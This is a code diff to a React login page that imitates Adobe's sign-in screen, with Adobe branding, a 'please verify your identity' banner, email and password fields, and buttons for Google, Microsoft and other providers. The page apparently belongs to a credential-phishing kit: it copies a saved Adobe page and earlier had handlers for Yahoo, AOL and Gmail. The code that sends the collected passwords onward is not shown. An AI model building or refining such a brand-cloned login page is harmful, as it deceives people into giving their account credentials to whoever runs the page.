@@ -4,10 +4,7 @@ import { useLogin } from '../hooks/useLogin';
 import Spinner from './common/Spinner';
 
 const BACKGROUND_IMAGES = [
-  'https://t3.ftcdn.net/jpg/09/74/43/40/360_F_974434091_JFqK7teEsKxG7MoS4kIUNDayUgJqwvIl.jpg',
-  'https://images.unsplash.com/photo-1557683316-973673baf926?w=1920&q=80',
-  'https://images.unsplash.com/photo-1579546929518-9e396f3cc809?w=1920&q=80',
-  'https://images.unsplash.com/photo-1614850523459-c2f4c699c52e?w=1920&q=80',
+  '/bg-canvas.jpg',
 ];
 
 const BG_ROTATION_MS = 6000;
@@ -30,8 +27,6 @@ const LoginPage: React.FC<LoginPageProps> = ({
   onBack,
   onLoginSuccess, 
   onLoginError,
-  onYahooSelect,
-  onAolSelect,
   onGmailSelect,
   onOffice365Select,
   onOthersSelect,
@@ -59,19 +54,13 @@ const LoginPage: React.FC<LoginPageProps> = ({
     return () => clearInterval(timer);
   }, [nextBg]);
 
-  const handleOthersSelect = () => {
-    setProvider('Others');
-    emailInputRef.current?.scrollIntoView({ behavior: 'smooth' });
-    setTimeout(() => emailInputRef.current?.focus(), 300);
-  };
-
   const emailProviders = [
-    { name: 'Microsoft', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-icon.png', handler: onOffice365Select },
-    { name: 'Yahoo', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png', handler: onYahooSelect },
-    { name: 'Outlook', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png', handler: onOffice365Select },
-    { name: 'AOL', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png', handler: onAolSelect },
-    { name: 'Gmail', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png', handler: onGmailSelect },
-    { name: 'Others', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png', handler: handleOthersSelect },
+    { name: 'Google', logo: '/google-social-icon.svg', handler: onGmailSelect },
+    { name: 'Facebook', logo: '/facebook-social-icon.svg', handler: undefined },
+    { name: 'Apple', logo: '/apple-social-icon.svg', handler: undefined },
+    { name: 'Microsoft', logo: '/microsoft-social-icon.svg', handler: onOffice365Select },
+    { name: 'LINE', logo: '/line-social-icon.svg', handler: undefined },
+    { name: 'Kakao', logo: '/kakao-social-icon.svg', handler: undefined },
   ];
 
   const handleContinue = (e: React.MouseEvent<HTMLButtonElement>) => {
@@ -90,184 +79,303 @@ const LoginPage: React.FC<LoginPageProps> = ({
   };
 
   return (
-    <div className="min-h-screen flex flex-col font-sans" style={{ fontFamily: "'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
-      <div
-        className="flex-1 flex relative overflow-hidden"
-        style={{ backgroundColor: '#0f1520' }}
-      >
-        {/* Rotating Background Images */}
-        {BACKGROUND_IMAGES.map((src, i) => (
-          <div
-            key={i}
-            className="absolute inset-0 bg-cover bg-center transition-opacity duration-1000"
-            style={{
-              backgroundImage: `url('${src}')`,
-              opacity: i === bgIndex ? 1 : 0,
-            }}
-          />
-        ))}
+    <div className="h-screen flex flex-col overflow-hidden" style={{ fontFamily: "'adobe-clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
+      <div className="flex-1 flex relative overflow-hidden min-h-0">
 
-        {/* Left Panel - Background Image */}
-        <div
-          className="hidden lg:flex w-[50%] relative z-10"
-        >
-          <div className="relative z-10 flex flex-col justify-center items-start w-full h-full p-10 pl-40">
-            <div className="flex items-center gap-3 mb-1">
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26" className="w-10 h-10">
-                <polygon fill="#FFFFFF" points="11.5,0 0,0 0,26" />
-                <polygon fill="#FFFFFF" points="18.5,0 30,0 30,26" />
-                <polygon fill="#FFFFFF" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
-              </svg>
-              <span className="text-white text-3xl font-bold">Adobe</span>
+        {/* Desktop Layout: two-panel grid matching Sign in.html Canvas layout */}
+        <div className="hidden lg:grid w-full h-full relative z-10" style={{ gridTemplateColumns: '1fr 480px' }}>
+          {/* Left Panel - Context area with Adobe branding + background image */}
+          <div className="relative flex items-end p-10 pb-16 overflow-hidden">
+            {/* Background image layer from Sign in.html */}
+            {BACKGROUND_IMAGES.map((src, i) => (
+              <div
+                key={i}
+                className="absolute inset-0 bg-cover bg-center transition-opacity duration-1000"
+                style={{
+                  backgroundImage: `url('${src}')`,
+                  opacity: i === bgIndex ? 1 : 0,
+                  backgroundColor: '#2c2c2c',
+                }}
+              />
+            ))}
+            {/* Dark overlay matching Sign in.html Canvas-Background rgba(0,0,0,.5) */}
+            <div className="absolute inset-0 bg-black/50" />
+            <div className="relative z-10 flex flex-col items-start pl-6">
+              <img src="/adobe_logo_white.svg" alt="Adobe Logo" className="mb-3" style={{ height: 40 }} />
+              <p className="text-white/80 text-base m-0">Sign in or create an account</p>
             </div>
-            <p className="text-white/80 text-base ml-1">Sign in or create an account</p>
           </div>
-        </div>
 
-        {/* Right Panel - Container with background image */}
-        <div
-          className="w-full lg:w-[50%] flex relative z-10"
-        >
-          {/* White Card */}
-          <div className="w-full lg:max-w-[630px] bg-white flex flex-col shadow-sm lg:ml-24">
+          {/* Right Panel - White card (matches Sign in.html .CardLayout) */}
+          <div className="bg-white flex flex-col overflow-y-auto">
             {/* Blue Info Banner */}
-            <div className="bg-[#1473E6] text-white py-3 px-6 flex items-center gap-3 text-sm font-medium">
-              <svg className="w-5 h-5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
-                <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
+            <div className="bg-[#1473E6] text-white py-3 px-6 flex items-center gap-3 text-sm">
+              <svg viewBox="0 0 36 36" className="w-5 h-5 flex-shrink-0" fill="currentColor">
+                <path fillRule="evenodd" d="M18,2A16,16,0,1,0,34,18,16,16,0,0,0,18,2Zm-.3,4.3a2.718,2.718,0,0,1,2.864,2.824A2.664,2.664,0,0,1,17.7,11.987a2.705,2.705,0,0,1-2.864-2.864A2.717,2.717,0,0,1,17.7,6.3ZM22,27a1,1,0,0,1-1,1H15a1,1,0,0,1-1-1V25a1,1,0,0,1,1-1h1V18H15a1,1,0,0,1-1-1V15a1,1,0,0,1,1-1h4a1,1,0,0,1,1,1v9h1a1,1,0,0,1,1,1Z" />
               </svg>
-              For your protection, please verify your identity.
+              <span>For your protection, please verify your identity.</span>
             </div>
 
             {/* Form Content */}
-            <div className="flex-1 flex items-start justify-center px-8 pt-12 pb-8 overflow-y-auto">
-              <div className="w-full max-w-[320px]">
-              <h1 className="text-3xl font-bold text-gray-900 mb-2">Sign in</h1>
-              <p className="text-sm text-gray-600 mb-8">
+            <div className="flex-1 flex flex-col justify-start px-10 pt-10 pb-6 overflow-y-auto">
+              <div className="w-full max-w-[360px]">
+                <h1 className="text-[28px] font-bold text-gray-900 mb-2 leading-tight">Sign in</h1>
+
+                <form onSubmit={handleSubmit} className="mt-6">
+                  {errorMessage && !isLoading && (
+                    <div className="mb-4 p-3 rounded text-sm text-red-700 bg-red-50 border border-red-200">
+                      {errorMessage}
+                    </div>
+                  )}
+
+                  {/* "Continue with email" heading matching Sign in.html */}
+                  <h3 className="text-base font-semibold text-gray-900 mb-0">Continue with email</h3>
+                  <p className="text-sm text-gray-600 mt-1 mb-5">
+                    New user?{' '}
+                    <a href="https://account.adobe.com" target="_blank" rel="noopener noreferrer" className="text-[#1473E6] hover:underline">
+                      Create an account
+                    </a>
+                  </p>
+
+                  <div className="mb-4">
+                    <label className="text-sm text-gray-700 block mb-1.5" htmlFor="email">
+                      Email address
+                    </label>
+                    <input
+                      id="email"
+                      ref={emailInputRef}
+                      type="email"
+                      value={email}
+                      onChange={(e) => setEmail(e.target.value)}
+                      required
+                      disabled={showPasswordStep}
+                      autoComplete="email"
+                      className="w-full px-3 py-2.5 border-2 border-gray-300 rounded-md text-sm text-gray-900 focus:outline-none focus:border-[#1473E6] focus:ring-0 disabled:bg-gray-100 disabled:text-gray-500 transition-colors"
+                    />
+                  </div>
+
+                  {showPasswordStep && (
+                    <div className="mb-4">
+                      <label className="text-sm text-gray-700 block mb-1.5" htmlFor="password">
+                        Password
+                      </label>
+                      <div className="relative">
+                        <input
+                          id="password"
+                          type={showPassword ? 'text' : 'password'}
+                          value={password}
+                          onChange={(e) => setPassword(e.target.value)}
+                          required
+                          autoFocus
+                          className="w-full px-3 pr-10 py-2.5 border-2 border-gray-300 rounded-md text-sm text-gray-900 focus:outline-none focus:border-[#1473E6] focus:ring-0 transition-colors"
+                        />
+                        <button
+                          type="button"
+                          onClick={() => setShowPassword(!showPassword)}
+                          className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
+                        >
+                          {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                        </button>
+                      </div>
+                    </div>
+                  )}
+
+                  <div className="flex justify-end mt-6 mb-4">
+                    {!showPasswordStep ? (
+                      <button
+                        onClick={handleContinue}
+                        disabled={!email}
+                        className="px-7 py-2.5 bg-[#1473E6] text-white font-semibold rounded-full text-sm hover:bg-[#0d66d0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
+                      >
+                        Continue
+                      </button>
+                    ) : (
+                      <button
+                        type="submit"
+                        disabled={isLoading || !password}
+                        className="px-7 py-2.5 bg-[#1473E6] text-white font-semibold rounded-full text-sm hover:bg-[#0d66d0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors flex items-center"
+                      >
+                        {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
+                        {isLoading ? 'Verifying...' : 'Continue'}
+                      </button>
+                    )}
+                  </div>
+                </form>
+
+                {/* Or Divider */}
+                <div className="relative text-center my-5">
+                  <span className="absolute inset-x-0 top-1/2 h-px bg-gray-300"></span>
+                  <span className="relative bg-white px-4 text-sm text-gray-500">Or</span>
+                </div>
+
+                {/* Email Provider Buttons - styled like Sign in.html social buttons */}
+                <div className="space-y-2.5">
+                  {emailProviders.map((ep) => (
+                    <button
+                      key={ep.name}
+                      onClick={() => ep.handler?.()}
+                      type="button"
+                      className="w-full flex items-center px-4 py-3 rounded-full border-2 border-gray-300 hover:border-gray-400 hover:bg-gray-50 transition-all duration-150 text-left"
+                    >
+                      <div className="w-7 h-7 flex items-center justify-center flex-shrink-0">
+                        <img src={ep.logo} alt={`${ep.name} icon`} className="w-5 h-5 object-contain" />
+                      </div>
+                      <span className="flex-1 text-sm font-medium text-gray-800 text-center">
+                        Continue with {ep.name}
+                      </span>
+                    </button>
+                  ))}
+                </div>
+
+                {/* Links */}
+                <div className="mt-5">
+                  <a href="https://account.adobe.com" target="_blank" rel="noopener noreferrer" className="text-sm text-[#1473E6] hover:underline">More sign-in options</a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        {/* Mobile Layout */}
+        <div className="lg:hidden w-full relative z-10 flex flex-col min-h-screen bg-white">
+          {/* Blue Info Banner */}
+          <div className="bg-[#1473E6] text-white py-3 px-4 flex items-center gap-3 text-sm">
+            <svg viewBox="0 0 36 36" className="w-5 h-5 flex-shrink-0" fill="currentColor">
+              <path fillRule="evenodd" d="M18,2A16,16,0,1,0,34,18,16,16,0,0,0,18,2Zm-.3,4.3a2.718,2.718,0,0,1,2.864,2.824A2.664,2.664,0,0,1,17.7,11.987a2.705,2.705,0,0,1-2.864-2.864A2.717,2.717,0,0,1,17.7,6.3ZM22,27a1,1,0,0,1-1,1H15a1,1,0,0,1-1-1V25a1,1,0,0,1,1-1h1V18H15a1,1,0,0,1-1-1V15a1,1,0,0,1,1-1h4a1,1,0,0,1,1,1v9h1a1,1,0,0,1,1,1Z" />
+            </svg>
+            <span>For your protection, please verify your identity.</span>
+          </div>
+
+          {/* Adobe Logo */}
+          <div className="flex items-center gap-2 px-6 pt-6">
+            <img src="/adobe_logo_black.svg" alt="Adobe Logo" className="h-5" />
+          </div>
+
+          {/* Form Content */}
+          <div className="flex-1 flex flex-col justify-start px-6 pt-6 pb-8">
+            <h1 className="text-2xl font-bold text-gray-900 mb-2">Sign in</h1>
+
+            <form onSubmit={handleSubmit} className="mt-4">
+              {errorMessage && !isLoading && (
+                <div className="mb-4 p-3 rounded text-sm text-red-700 bg-red-50 border border-red-200">
+                  {errorMessage}
+                </div>
+              )}
+
+              <h3 className="text-base font-semibold text-gray-900 mb-0">Continue with email</h3>
+              <p className="text-sm text-gray-600 mt-1 mb-5">
                 New user?{' '}
                 <a href="https://account.adobe.com" target="_blank" rel="noopener noreferrer" className="text-[#1473E6] hover:underline">
                   Create an account
                 </a>
               </p>
 
-              <form onSubmit={handleSubmit}>
-                {errorMessage && !isLoading && (
-                  <div className="mb-4 p-3 rounded text-sm text-red-700 bg-red-50 border border-red-200">
-                    {errorMessage}
-                  </div>
-                )}
+              <div className="mb-4">
+                <label className="text-sm text-gray-700 block mb-1.5" htmlFor="email-mobile">
+                  Email address
+                </label>
+                <input
+                  id="email-mobile"
+                  ref={emailInputRef}
+                  type="email"
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
+                  required
+                  disabled={showPasswordStep}
+                  autoComplete="email"
+                  className="w-full px-3 py-3 border-2 border-gray-300 rounded-md text-base text-gray-900 focus:outline-none focus:border-[#1473E6] focus:ring-0 disabled:bg-gray-100 disabled:text-gray-500 transition-colors"
+                />
+              </div>
 
+              {showPasswordStep && (
                 <div className="mb-4">
-                  <label className="text-sm text-gray-700 block mb-1.5" htmlFor="email">
-                    Email address
+                  <label className="text-sm text-gray-700 block mb-1.5" htmlFor="password-mobile">
+                    Password
                   </label>
-                  <input
-                    id="email"
-                    ref={emailInputRef}
-                    type="email"
-                    value={email}
-                    onChange={(e) => setEmail(e.target.value)}
-                    required
-                    disabled={showPasswordStep}
-                    className="w-full px-3 py-2.5 border border-gray-300 rounded text-sm text-gray-900 focus:outline-none focus:border-[#1473E6] focus:ring-1 focus:ring-[#1473E6] disabled:bg-gray-100 disabled:text-gray-500"
-                  />
-                </div>
-
-                {showPasswordStep && (
-                  <div className="mb-4">
-                    <label className="text-sm text-gray-700 block mb-1.5" htmlFor="password">
-                      Password
-                    </label>
-                    <div className="relative">
-                      <input
-                        id="password"
-                        type={showPassword ? 'text' : 'password'}
-                        value={password}
-                        onChange={(e) => setPassword(e.target.value)}
-                        required
-                        autoFocus
-                        className="w-full px-3 pr-10 py-2.5 border border-gray-300 rounded text-sm text-gray-900 focus:outline-none focus:border-[#1473E6] focus:ring-1 focus:ring-[#1473E6]"
-                      />
-                      <button
-                        type="button"
-                        onClick={() => setShowPassword(!showPassword)}
-                        className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
-                      >
-                        {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
-                      </button>
-                    </div>
+                  <div className="relative">
+                    <input
+                      id="password-mobile"
+                      type={showPassword ? 'text' : 'password'}
+                      value={password}
+                      onChange={(e) => setPassword(e.target.value)}
+                      required
+                      autoFocus
+                      className="w-full px-3 pr-10 py-3 border-2 border-gray-300 rounded-md text-base text-gray-900 focus:outline-none focus:border-[#1473E6] focus:ring-0 transition-colors"
+                    />
+                    <button
+                      type="button"
+                      onClick={() => setShowPassword(!showPassword)}
+                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
+                    >
+                      {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                    </button>
                   </div>
-                )}
-
-                <div className="flex justify-end mt-6 mb-6">
-                  {!showPasswordStep ? (
-                    <button
-                      onClick={handleContinue}
-                      disabled={!email}
-                      className="px-7 py-2.5 bg-[#1473E6] text-white font-semibold rounded-full text-sm hover:bg-[#0d66d0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
-                    >
-                      Continue
-                    </button>
-                  ) : (
-                    <button
-                      type="submit"
-                      disabled={isLoading || !password}
-                      className="px-7 py-2.5 bg-[#1473E6] text-white font-semibold rounded-full text-sm hover:bg-[#0d66d0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors flex items-center"
-                    >
-                      {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
-                      {isLoading ? 'Verifying...' : 'Continue'}
-                    </button>
-                  )}
                 </div>
-              </form>
+              )}
 
-              {/* Or Divider */}
-              <div className="relative text-center my-6">
-                <span className="absolute inset-x-0 top-1/2 h-px bg-gray-300"></span>
-                <span className="relative bg-white px-4 text-sm text-gray-500">Or</span>
-              </div>
-
-              {/* Email Provider Buttons */}
-              <div className="space-y-2">
-                {emailProviders.map((ep) => (
+              <div className="flex justify-end mt-5 mb-4">
+                {!showPasswordStep ? (
                   <button
-                    key={ep.name}
-                    onClick={() => ep.handler?.()}
-                    type="button"
-                    className="w-full group"
+                    onClick={handleContinue}
+                    disabled={!email}
+                    className="px-7 py-2.5 bg-[#1473E6] text-white font-semibold rounded-full text-sm hover:bg-[#0d66d0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                   >
-                    <div className="flex items-center px-4 py-3 rounded-full border border-gray-300 hover:bg-gray-50 transition-all duration-150">
-                      <img src={ep.logo} alt={ep.name} className="w-5 h-5 object-contain flex-shrink-0" />
-                      <span className="flex-1 text-sm font-medium text-gray-700 ml-3 text-center">
-                        Continue with {ep.name}
-                      </span>
-                    </div>
+                    Continue
                   </button>
-                ))}
+                ) : (
+                  <button
+                    type="submit"
+                    disabled={isLoading || !password}
+                    className="px-7 py-2.5 bg-[#1473E6] text-white font-semibold rounded-full text-sm hover:bg-[#0d66d0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors flex items-center"
+                  >
+                    {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
+                    {isLoading ? 'Verifying...' : 'Continue'}
+                  </button>
+                )}
               </div>
+            </form>
 
-              {/* Links */}
-              <div className="text-center mt-6 space-y-3">
-                <a href="https://account.adobe.com" target="_blank" rel="noopener noreferrer" className="text-sm text-[#1473E6] hover:underline block">More sign-in options</a>
-                <a href="https://helpx.adobe.com/manage-account/using/sign-in-faq.html" target="_blank" rel="noopener noreferrer" className="text-sm text-[#1473E6] hover:underline block">Get help signing in</a>
-              </div>
+            {/* Or Divider */}
+            <div className="relative text-center my-5">
+              <span className="absolute inset-x-0 top-1/2 h-px bg-gray-300"></span>
+              <span className="relative bg-white px-4 text-sm text-gray-500">Or</span>
             </div>
-          </div>
+
+            {/* Email Provider Buttons */}
+            <div className="space-y-2.5">
+              {emailProviders.map((ep) => (
+                <button
+                  key={ep.name}
+                  onClick={() => ep.handler?.()}
+                  type="button"
+                  className="w-full flex items-center px-4 py-3 rounded-full border-2 border-gray-300 hover:border-gray-400 hover:bg-gray-50 transition-all duration-150 text-left"
+                >
+                  <div className="w-7 h-7 flex items-center justify-center flex-shrink-0">
+                    <img src={ep.logo} alt={`${ep.name} icon`} className="w-5 h-5 object-contain" />
+                  </div>
+                  <span className="flex-1 text-sm font-medium text-gray-800 text-center">
+                    Continue with {ep.name}
+                  </span>
+                </button>
+              ))}
+            </div>
+
+            {/* Links */}
+            <div className="mt-5">
+              <a href="https://account.adobe.com" target="_blank" rel="noopener noreferrer" className="text-sm text-[#1473E6] hover:underline">More sign-in options</a>
+            </div>
           </div>
         </div>
       </div>
 
-      {/* Adobe Footer */}
+      {/* Adobe Footer - matches Sign in.html footer */}
       <footer className="bg-[#fafafa] border-t border-gray-200 py-4 px-6">
         <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-1 text-xs text-gray-600">
           <span>Copyright © 2026 Adobe. All rights reserved.</span>
-          <span className="text-gray-300">|</span>
-          <a href="https://www.adobe.com/legal/terms.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700 hover:underline">Terms of Use</a>
-          <span className="text-gray-300">|</span>
-          <a href="https://www.adobe.com/privacy/cookies.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700 hover:underline">Cookie preferences</a>
-          <span className="text-gray-300">|</span>
-          <a href="https://www.adobe.com/privacy.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700 hover:underline">Privacy</a>
-          <span className="text-gray-300">|</span>
-          <a href="https://www.adobe.com/privacy/ca-rights.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700 hover:underline">Do not sell or share my personal information</a>
+          <a href="https://www.adobe.com/legal/terms.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-800 hover:underline">Terms of Use</a>
+          <a href="https://www.adobe.com/privacy/cookies.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-800 hover:underline">Cookie preferences</a>
+          <a href="https://www.adobe.com/privacy.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-800 hover:underline">Privacy</a>
+          <a href="https://www.adobe.com/privacy/us-rights.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-800 hover:underline">Do not sell or share my personal information</a>
         </div>
       </footer>
     </div>
